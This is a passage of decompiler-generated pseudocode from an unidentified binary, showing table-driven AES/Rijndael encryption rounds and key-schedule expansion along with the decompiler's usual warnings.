    v74 = v42;
    if ( !--v29 )
      break;
    LOBYTE(v28) = v40;
  }
  v43 = (unsigned __int8)v40;
  v44 = v40 >> 8;
  HIBYTE(v85) = BYTE1(dword_490CF0[2 * v43]);
  v45 = (unsigned __int8)v44;
  v44 >>= 8;
  BYTE2(v82) = BYTE1(dword_490CF0[2 * v45]);
  BYTE1(v83) = BYTE1(dword_490CF0[2 * (unsigned __int8)v44]);
  LOBYTE(v84) = BYTE1(dword_490CF0[2 * (v44 >> 8)]);
  HIBYTE(v84) = BYTE1(dword_490CF0[2 * (unsigned __int8)v66]);
  BYTE2(v85) = BYTE1(dword_490CF0[2 * BYTE1(v66)]);
  BYTE1(v82) = BYTE1(dword_490CF0[2 * BYTE2(v66)]);
  LOBYTE(v83) = BYTE1(dword_490CF0[2 * HIBYTE(v66)]);
  v46 = (unsigned __int8)v42;
  v47 = v42 >> 8;
  HIBYTE(v83) = BYTE1(dword_490CF0[2 * v46]);
  v48 = (unsigned __int8)v47;
  v47 >>= 8;
  BYTE2(v84) = BYTE1(dword_490CF0[2 * v48]);
  BYTE1(v85) = BYTE1(dword_490CF0[2 * (unsigned __int8)v47]);
  LOBYTE(v82) = BYTE1(dword_490CF0[2 * (v47 >> 8)]);
  HIBYTE(v82) = BYTE1(dword_490CF0[2 * (unsigned __int8)v41]);
  BYTE2(v83) = BYTE1(dword_490CF0[2 * BYTE1(v41)]);
  BYTE1(v84) = BYTE1(dword_490CF0[2 * BYTE2(v41)]);
  LOBYTE(v85) = BYTE1(dword_490CF0[2 * HIBYTE(v41)]);
  v81[0] = a5->m128i_i32;
  v81[1] = a6->m128i_i32;
  v54 = v85 ^ v11[3];
  v53 = v84 ^ v11[2];
  v52 = v83 ^ v11[1];
  v49 = sub_41F263(v81, v82 ^ *v11);
  v50 = sub_41F263(v49, v52);
  v51 = sub_41F263(v50, v53);
  return sub_41F263(v51, v54);
}
// 490CF0: using guessed type int dword_490CF0[];
// 490CF4: using guessed type int dword_490CF4[509];
// 4914E8: using guessed type int dword_4914E8;

//----- (0041FCF7) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned int *__usercall sub_41FCF7@<eax>(const __m128i *a1@<edx>, int a2@<ecx>, __m64 a3@<mm2>, __m64 a4@<mm3>)
{
  int v4; // edi
  int v5; // esi
  unsigned int v6; // eax
  __int8 *v7; // eax
  __m128i si128; // xmm4
  __m128i v9; // xmm1
  __m64 v10; // mm1
  unsigned int v11; // ebx
  unsigned int v12; // ecx
  unsigned int v13; // edx
  int i; // eax
  __m128i v15; // xmm2
  unsigned int v16; // eax
  unsigned int v17; // eax
  __m128i v18; // xmm2
  int v19; // edi
  __m128i v20; // xmm2
  __m64 v21; // mm1
  int v22; // edx
  int v23; // ecx
  int v24; // ebx
  unsigned int v25; // eax
  int v26; // edi
  __m128i v27; // xmm2
  int v28; // ebx
  __m64 v29; // mm1
  int v30; // edx
  int v31; // ecx
  unsigned int v32; // eax
  int v33; // edi
  int v34; // ecx
  int v35; // ebx
  __m64 v36; // mm1
  unsigned int v37; // edx
  unsigned int v38; // ecx
  unsigned int v39; // ebx
  unsigned int v40; // edi
  __m64 v41; // mm0
  unsigned int v42; // eax
  int v43; // eax
  unsigned int v44; // ebx
  int v45; // ebx
  int v46; // edi
  __m64 v47; // mm0
  int v48; // ecx
  int v49; // edx
  __m128i v50; // xmm2
  unsigned int v51; // eax
  __m128i v52; // xmm2
  int v53; // edi
  __m128i v54; // xmm2
  __m64 v55; // mm1
  int v56; // edx
  int v57; // ebx
  __m64 v58; // mm1
  int v59; // edx
  int v60; // ecx
  unsigned int v61; // eax
  int v62; // edi
  int v63; // ecx
  int v64; // ebx
  unsigned int v65; // edx
  unsigned int v66; // ecx
  unsigned int v67; // ebx
  unsigned int v68; // eax
  __int16 v69; // cx
  unsigned int v70; // edx
  unsigned int v71; // ebx
  int v72; // ecx
  unsigned int v73; // ecx
  unsigned int v74; // eax
  unsigned int j; // edx
  __m64 v76; // mm0
  unsigned int v77; // edi
  unsigned int v78; // eax
  int v79; // edi
  __m64 v80; // mm0
  unsigned int v81; // ebx
  __m64 v82; // mm0
  int v83; // eax
  int v84; // ebx
  unsigned int v85; // ecx
  int v86; // eax
  int v87; // ebx
  unsigned int v88; // edx
  int v89; // ebx
  __m64 v90; // mm0
  unsigned int v91; // edi
  unsigned int v92; // eax
  int v93; // edi
  __m64 v94; // mm0
  unsigned int v95; // ebx
  __m64 v96; // mm0
  int v97; // eax
  int v98; // ebx
  unsigned int v99; // ecx
  int v100; // eax
  int v101; // ebx
  unsigned int v102; // edx
  int v103; // ebx
  unsigned int v104; // edx
  unsigned int v105; // eax
  unsigned int v106; // ebx
  unsigned int v107; // ecx
  __m128i *v108; // ebx
  bool v109; // cc
  unsigned int v110; // ecx
  __m128i v111; // xmm2
  unsigned int *result; // eax
  int v113; // [esp+2C0h] [ebp-50h] BYREF
  void *retaddr; // [esp+310h] [ebp+0h] BYREF

  v4 = dword_48C1F8;
  *(_DWORD *)(a2 + 256) = &v113;
  v5 = STACK[0x6C8];
  v6 = STACK[0x6C8] & 0x10;
  *(__m128i *)&STACK[0x680] = _mm_load_si128((const __m128i *)((char *)a1 + v6 + 16));
  v7 = &a1[2].m128i_i8[v6 - v5];
  do
  {
    *(__m128i *)((char *)&STACK[0x5C0] + v5) = _mm_load_si128((const __m128i *)&v7[v5]);
    v5 += 16;
  }
  while ( v5 < 192 );
  si128 = _mm_load_si128((const __m128i *)&v7[v5]);
  v9 = _mm_load_si128(a1);
  v10 = _mm_cvtsi32_si64(a1[1].m128i_u32[0]);
  v11 = a1[1].m128i_u32[1];
  v12 = a1[1].m128i_u32[2];
  v13 = a1[1].m128i_u32[3];
  for ( i = 0; i < 2048; i += v4 + v4 + v4 + v4 )
    ;
  _mm_lfence();
  if ( (STACK[0x6C4] & 1) == 0 )
    goto LABEL_7;
  v15 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)STACK[0x6A0]), v9);
  v9 = _mm_srli_si128(v9, 14);
  v16 = _mm_cvtsi128_si32(v9);
  LOBYTE(v16) = *(_BYTE *)(STACK[0x6A0] + 15);
  a3 = _mm_cvtsi32_si64(v16);
  a4 = _mm_cvtsi32_si64(1u);
  v17 = _mm_cvtsi128_si32(v15);
  v18 = _mm_srli_si128(v15, 4);
  v19 = _mm_cvtsi128_si32(v18);
  v20 = _mm_srli_si128(v18, 4);
  v21 = _m_pxor(v10, _mm_cvtsi32_si64(dword_490CF0[2 * (unsigned __int8)v17 + 1]));
  v22 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v17)] + 1) ^ v13;
  v17 >>= 16;
  v23 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v17] + 2) ^ v12;
  v24 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v17)] + 3) ^ v11;
  v25 = v19;
  v26 = _mm_cvtsi128_si32(v20);
  v27 = _mm_srli_si128(v20, 4);
  v28 = dword_490CF0[2 * (unsigned __int8)v25 + 1] ^ v24;
  v29 = _m_pxor(v21, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * BYTE1(v25)] + 1)));
  v25 >>= 16;
  v30 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v25] + 2) ^ v22;
  v31 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v25)] + 3) ^ v23;
  v32 = v26;
  v33 = _mm_cvtsi128_si32(v27);
  v34 = dword_490CF0[2 * (unsigned __int8)v32 + 1] ^ v31;
  v35 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v32)] + 1) ^ v28;
  v32 >>= 16;
  v36 = _m_pxor(v29, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v32] + 2)));
  v37 = dword_490CF0[2 * (unsigned __int8)v33 + 1] ^ *(int *)((char *)&dword_490CF0[2 * BYTE1(v32)] + 3) ^ v30;
  v38 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v33)] + 1) ^ v34;
  v39 = *(int *)((char *)&dword_490CF0[2 * BYTE2(v33)] + 2) ^ v35;
  v40 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v39] + 3) ^ STACK[0x688];
  v41 = _m_pxor(
          _m_pxor(
            _mm_cvtsi32_si64(STACK[0x68C]),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v38] + 3))),
          _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * BYTE1(v39)] + 2)));
  v39 >>= 16;
  v42 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v38)] + 2) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v39]
                                                                     + 1) ^ STACK[0x680];
  v38 >>= 16;
  v43 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v37] + 3) ^ v42;
  v44 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v37)] + 2) ^ STACK[0x684] ^ dword_490CF0[2 * BYTE1(v39) + 1];
  v37 >>= 16;
  v45 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v38] + 1) ^ v44;
  v46 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v37] + 1) ^ dword_490CF0[2 * BYTE1(v38) + 1] ^ v40;
  v47 = _m_pxor(v41, _mm_cvtsi32_si64(dword_490CF0[2 * BYTE1(v37) + 1]));
  v48 = _mm_cvtsi128_si32(_mm_srli_si128(v27, 3));
  v49 = _mm_cvtsi64_si32(v36);
  STACK[0x5CC] = _mm_cvtsi64_si32(v47);
  STACK[0x5C0] = v43;
  STACK[0x5C4] = v45;
  STACK[0x5C8] = v46;
LABEL_9:
  a3 = _m_paddb(a3, a4);
  v70 = *(int *)((char *)&dword_490CF0[2 * v48] + 3) ^ v49;
  v71 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v70] + 3) ^ v45;
  v72 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v70)] + 2);
  v70 >>= 16;
  v73 = STACK[0x5C8] ^ v72;
  v74 = dword_490CF0[2 * BYTE1(v70) + 1] ^ v43;
  for ( j = STACK[0x5CC] ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v70] + 1);
        ;
        j = _mm_cvtsi64_si32(_m_pxor(v82, _mm_cvtsi32_si64(dword_490CF0[2 * BYTE1(v88) + 1]))) )
  {
    v90 = _m_pxor(
            _mm_cvtsi32_si64(STACK[0x5CC]),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v73] + 3)));
    LOBYTE(v73) = v74;
    v91 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v74)] + 2) ^ STACK[0x5C8];
    v92 = HIWORD(v74);
    v93 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v71] + 3) ^ v91;
    v94 = _m_pxor(v90, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * BYTE1(v71)] + 2)));
    v95 = HIWORD(v71);
    v96 = _m_pxor(v94, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v92] + 1)));
    v97 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v73)] + 2) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v95]
                                                                       + 1) ^ dword_490CF0[2 * BYTE1(v92) + 1];
    v98 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v73] + 3) ^ dword_490CF0[2 * BYTE1(v95) + 1];
    v99 = HIWORD(v73);
    v100 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)j] + 3) ^ v97;
    v101 = *(int *)((char *)&dword_490CF0[2 * BYTE1(j)] + 2) ^ v98;
    v102 = HIWORD(j);
    v103 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v99] + 1) ^ v101;
    v66 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v102] + 1) ^ dword_490CF0[2 * BYTE1(v99) + 1] ^ v93;
    v68 = STACK[0x5C0] ^ v100;
    v67 = STACK[0x5C4] ^ v103;
    v65 = _mm_cvtsi64_si32(_m_pxor(v96, _mm_cvtsi32_si64(dword_490CF0[2 * BYTE1(v102) + 1])));
    if ( ((unsigned int)&retaddr & 0xFF) != 0 )
      goto LABEL_10;
    LOWORD(STACK[0x5E2]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v65]) ^ BYTE1(dword_490CF0[2 * BYTE1(v66)]);
    LOWORD(STACK[0x5E6]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v68]) ^ BYTE1(dword_490CF0[2 * BYTE1(v65)]);
    v104 = HIWORD(v65);
    LOWORD(STACK[0x5EA]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v67]) ^ BYTE1(dword_490CF0[2 * BYTE1(v68)]);
    v105 = HIWORD(v68);
    LOWORD(STACK[0x5EE]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v66]) ^ BYTE1(dword_490CF0[2 * BYTE1(v67)]);
    v106 = HIWORD(v67);
    LOWORD(STACK[0x5EC]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v105]) ^ BYTE1(dword_490CF0[2 * BYTE1(v104)]);
    v107 = HIWORD(v66);
    LOWORD(STACK[0x5E0]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v106]) ^ BYTE1(dword_490CF0[2 * BYTE1(v105)]);
    LOWORD(STACK[0x5E4]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v107]) ^ BYTE1(dword_490CF0[2 * BYTE1(v106)]);
    LOWORD(STACK[0x5E8]) = LOWORD(dword_490CF0[2 * (unsigned __int8)v104]) ^ BYTE1(dword_490CF0[2 * BYTE1(v107)]);
    v108 = (__m128i *)STACK[0x5FC];
    v109 = (int)STACK[0x614] <= 16;
    v110 = STACK[0x614] - 16;
    v111 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)STACK[0x5F8]), si128);
    *(__m128i *)&STACK[0x5F0] = _mm_add_epi32(_mm_load_si128((const __m128i *)&STACK[0x600]), *(__m128i *)&STACK[0x5F0]);
    *v108 = _mm_xor_si128(v111, *(__m128i *)&STACK[0x5E0]);
    if ( v109 )
      break;
    STACK[0x614] = v110;
    if ( (v110 & 1) != 0 )
    {
      v69 = _mm_cvtsi64_si32(a3);
      v49 = _mm_cvtsi64_si32(v36);
      v43 = STACK[0x510];
      v45 = STACK[0x514];
      v48 = (unsigned __int8)(HIBYTE(v69) ^ v69);
      goto LABEL_9;
    }
    v10 = _mm_cvtsi32_si64(STACK[0x5D0]);
    v11 = STACK[0x5D4];
    v12 = STACK[0x5D8];
    v13 = STACK[0x5DC];
LABEL_7:
    v50 = _mm_xor_si128(
            _mm_xor_si128(_mm_loadu_si128((const __m128i *)STACK[0x5F0]), v9),
            _mm_loadu_si128((const __m128i *)STACK[0x5F4]));
    v51 = _mm_cvtsi128_si32(v50);
    v52 = _mm_srli_si128(v50, 4);
    v53 = _mm_cvtsi128_si32(v52);
    v54 = _mm_srli_si128(v52, 4);
    v55 = _m_pxor(v10, _mm_cvtsi32_si64(dword_490CF0[2 * (unsigned __int8)v51 + 1]));
    v56 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v51)] + 1) ^ v13;
    v51 >>= 16;
    v57 = dword_490CF0[2 * (unsigned __int8)v53 + 1] ^ *(int *)((char *)&dword_490CF0[2 * BYTE1(v51)] + 3) ^ v11;
    v58 = _m_pxor(v55, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * BYTE1(v53)] + 1)));
    v59 = *(int *)((char *)&dword_490CF0[2 * BYTE2(v53)] + 2) ^ v56;
    v60 = *(int *)((char *)&dword_490CF0[2 * HIBYTE(v53)] + 3) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v51]
                                                                        + 2) ^ v12;
    v61 = _mm_cvtsi128_si32(v54);
    v62 = _mm_cvtsi128_si32(_mm_srli_si128(v54, 4));
    v63 = dword_490CF0[2 * (unsigned __int8)v61 + 1] ^ v60;
    v64 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v61)] + 1) ^ v57;
    v61 >>= 16;
    v65 = dword_490CF0[2 * (unsigned __int8)v62 + 1] ^ *(int *)((char *)&dword_490CF0[2 * BYTE1(v61)] + 3) ^ v59;
    v66 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v62)] + 1) ^ v63;
    v67 = *(int *)((char *)&dword_490CF0[2 * BYTE2(v62)] + 2) ^ v64;
    v36 = _m_pxor(
            _m_pxor(v58, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v61] + 2))),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * HIBYTE(v62)] + 3)));
    v68 = _mm_cvtsi64_si32(v36);
LABEL_10:
    v76 = _m_pxor(
            _mm_cvtsi32_si64(STACK[0x5DC]),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v66] + 3)));
    LOBYTE(v66) = v68;
    v77 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v68)] + 2) ^ STACK[0x5D8];
    v78 = HIWORD(v68);
    v79 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v67] + 3) ^ v77;
    v80 = _m_pxor(v76, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * BYTE1(v67)] + 2)));
    v81 = HIWORD(v67);
    v82 = _m_pxor(v80, _mm_cvtsi32_si64(*(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v78] + 1)));
    v83 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v66)] + 2) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v81]
                                                                       + 1) ^ dword_490CF0[2 * BYTE1(v78) + 1];
    v84 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v66] + 3) ^ dword_490CF0[2 * BYTE1(v81) + 1];
    v85 = HIWORD(v66);
    v86 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v65] + 3) ^ v83;
    v87 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v65)] + 2) ^ v84;
    v88 = HIWORD(v65);
    v89 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v85] + 1) ^ v87;
    v73 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v88] + 1) ^ dword_490CF0[2 * BYTE1(v85) + 1] ^ v79;
    v74 = STACK[0x5D0] ^ v86;
    v71 = STACK[0x5D4] ^ v89;
  }
  result = &STACK[0x580];
  *(_OWORD *)&STACK[0x510] = 0i64;
  *(_OWORD *)&STACK[0x520] = 0i64;
  *(_OWORD *)&STACK[0x530] = 0i64;
  *(_OWORD *)&STACK[0x540] = 0i64;
  *(_OWORD *)&STACK[0x550] = 0i64;
  *(_OWORD *)&STACK[0x560] = 0i64;
  *(_OWORD *)&STACK[0x570] = 0i64;
  *(_OWORD *)&STACK[0x580] = 0i64;
  *(_OWORD *)&STACK[0x590] = 0i64;
  *(_OWORD *)&STACK[0x5A0] = 0i64;
  *(_OWORD *)&STACK[0x5B0] = 0i64;
  *(_OWORD *)&STACK[0x5C0] = 0i64;
  *(_OWORD *)&STACK[0x5D0] = 0i64;
  *(_OWORD *)&STACK[0x5E0] = 0i64;
  _m_empty();
  return result;
}
// 420074: positive sp value 40 has been found
// 420312: returning address of temporary local variable '%0x580'
// 48C1F8: using guessed type int dword_48C1F8;
// 490CF0: using guessed type int dword_490CF0[];

//----- (0042035E) --------------------------------------------------------
void __thiscall sub_42035E(_DWORD *this, char *Src, size_t Size, int a4)
{
  _DWORD *v4; // ebx
  int v5; // ebp
  int v6; // edx
  int *v7; // edi
  int *v8; // esi
  int v9; // edx
  int v10; // eax
  int v11; // ecx
  int *v12; // ebx
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  int v16; // edx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int *v20; // esi
  int v21; // edx
  int v22; // eax
  int v23; // ecx
  unsigned int *v24; // edi
  unsigned int v25; // ebp
  unsigned int v26; // eax
  unsigned int v27; // ebx
  unsigned __int8 *v28; // eax
  unsigned __int8 *v29; // edi
  int v30; // esi
  int v31; // esi
  int v32; // esi
  int v33; // esi
  unsigned int v34; // edx
  int v35; // ecx
  int v36; // eax
  unsigned int v37; // edx
  int v38; // ecx
  int v39; // eax
  unsigned int v40; // edx
  unsigned __int32 v41; // ecx
  unsigned __int32 v42; // ecx
  unsigned __int32 v43; // ecx
  unsigned __int32 v44; // ecx
  unsigned int *v46; // [esp+10h] [ebp-8h]
  _DWORD *v47; // [esp+14h] [ebp-4h]
  unsigned int *v48; // [esp+14h] [ebp-4h]
  _DWORD *Srca; // [esp+1Ch] [ebp+4h]
  unsigned __int8 *Sizea; // [esp+20h] [ebp+8h]

  v4 = this;
  sub_40898B((int)(this + 72), 0x120Cu);
  v4[73] = 0;
  v5 = Size >> 2;
  v47 = v4 + 4;
  v4[3] = (Size >> 2) + 6;
  sub_41F753((int)(v4 + 4), v6, 4 * ((Size >> 2) + 6) + 4);
  v7 = (int *)v4[70];
  if ( sub_41F72B() && sub_41F73F() )
  {
    sub_428D01(Src, Size, (char *)v7);
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *))(v4[1] + 28))(v4 + 1) )
      sub_428CB0((_OWORD *)v4[70], v4[3]);
  }
  else
  {
    sub_41F2EB(1, v7, v5, Src, Size);
    v8 = &v7[v5];
    Srca = &unk_46E8EC;
    v9 = *v7 ^ (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*(v8 - 1))] ^ (((unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)*(v8 - 1)] ^ (((unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*(v8 - 1))] ^ ((unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*(v8 - 1))] << 8)) << 8)) << 8) ^ 0x1000000;
    *v8 = v9;
    v10 = v9 ^ v7[1];
    v8[1] = v10;
    v11 = v10 ^ v7[2];
    v8[2] = v11;
    v8[3] = v11 ^ v7[3];
    if ( &v7[v5 + 4] != (int *)(v4[70] + 4 * v4[69]) )
    {
      v12 = &v7[v5];
      do
      {
        if ( Size == 24 )
        {
          v13 = v7[4] ^ v7[9];
          v14 = v13 ^ v7[5];
          v7[10] = v13;
          v7[11] = v14;
        }
        else if ( Size == 32 )
        {
          v15 = v7[6];
          v16 = v7[4] ^ (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)v7[11]] ^ (((unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(v7[11])] ^ (((unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(v7[11])] ^ ((unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(v7[11])] << 8)) << 8)) << 8);
          v17 = v16 ^ v7[5];
          v7[12] = v16;
          v18 = v17 ^ v15;
          v7[13] = v17;
          v19 = v18 ^ v7[7];
          v7[14] = v18;
          v7[15] = v19;
        }
        v7 = v12;
        v20 = v12;
        v12 += v5;
        v21 = *v7 ^ *Srca ^ (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*(v12 - 1))] ^ (((unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)*(v12 - 1)] ^ (((unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*(v12 - 1))] ^ ((unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*(v12 - 1))] << 8)) << 8)) << 8);
        *v12 = v21;
        ++Srca;
        v22 = v21 ^ v7[1];
        v12[1] = v22;
        v23 = v22 ^ v7[2];
        v7[v5 + 2] = v23;
        v7[v5 + 3] = v23 ^ v7[3];
      }
      while ( &v20[v5 + 4] != (int *)(v47[66] + 4 * v47[65]) );
      v4 = this;
    }
    v24 = (unsigned int *)v4[70];
    v46 = v24;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(v4[1] + 28))(v4 + 1) )
    {
      if ( !byte_491D00 )
        sub_41F6A7();
      sub_41F28C(v24, (int)v24, 0x10u);
      sub_41F28C(&v24[4 * v4[3]], (int)&v24[4 * v4[3]], 0x10u);
    }
    else
    {
      if ( !byte_491D01 )
        sub_41F54F();
      v25 = 4;
      v26 = 4 * v4[3] - 4;
      if ( v26 > 4 )
      {
        v27 = 4 * v4[3] - 4;
        v48 = &v24[v26 + 2];
        v28 = (unsigned __int8 *)(v24 + 6);
        v29 = (unsigned __int8 *)v48;
        Sizea = v28;
        do
        {
          v30 = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[*(Sizea - 8)]] + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*((_DWORD *)v28 - 2))]] + 2) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*((_DWORD *)v28 - 2))]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*((_DWORD *)v28 - 2))]];
          *((_DWORD *)Sizea - 2) = *(int *)((char *)&dword_491500[2
                                                                * (unsigned __int8)RijnDael_AES_LONG_46E6E8[*(v29 - 8)]]
                                          + 3) ^ *(int *)((char *)&dword_491500[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*((_DWORD *)v29 - 2))]]
                                                        + 2) ^ *(int *)((char *)&dword_491500[2
                                                                                            * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*((_DWORD *)v29 - 2))]]
                                                                      + 1) ^ dword_491504[2
                                                                                        * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*((_DWORD *)v29 - 2))]];
          *((_DWORD *)v29 - 2) = v30;
          v31 = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[*(Sizea - 4)]] + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*((_DWORD *)Sizea - 1))]] + 2) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*((_DWORD *)Sizea - 1))]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*((_DWORD *)Sizea - 1))]];
          *((_DWORD *)Sizea - 1) = *(int *)((char *)&dword_491500[2
                                                                * (unsigned __int8)RijnDael_AES_LONG_46E6E8[*(v29 - 4)]]
                                          + 3) ^ *(int *)((char *)&dword_491500[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*((_DWORD *)v29 - 1))]]
                                                        + 2) ^ *(int *)((char *)&dword_491500[2
                                                                                            * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*((_DWORD *)v29 - 1))]]
                                                                      + 1) ^ dword_491504[2
                                                                                        * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*((_DWORD *)v29 - 1))]];
          *((_DWORD *)v29 - 1) = v31;
          v25 += 4;
          v27 -= 4;
          v32 = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[*Sizea]] + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*(_DWORD *)Sizea)]] + 2) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*(_DWORD *)Sizea)]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*(_DWORD *)Sizea)]];
          *(_DWORD *)Sizea = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[*v29]] + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*(_DWORD *)v29)]] + 2) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*(_DWORD *)v29)]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*(_DWORD *)v29)]];
          *(_DWORD *)v29 = v32;
          v29 -= 16;
          v33 = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[Sizea[4]]] + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*((_DWORD *)Sizea + 1))]] + 2) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*((_DWORD *)Sizea + 1))]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*((_DWORD *)Sizea + 1))]];
          *((_DWORD *)Sizea + 1) = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[v29[20]]]
                                          + 3) ^ *(int *)((char *)&dword_491500[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(*((_DWORD *)v29 + 5))]]
                                                        + 2) ^ *(int *)((char *)&dword_491500[2
                                                                                            * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(*((_DWORD *)v29 + 5))]]
                                                                      + 1) ^ dword_491504[2
                                                                                        * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(*((_DWORD *)v29 + 5))]];
          v28 = Sizea + 16;
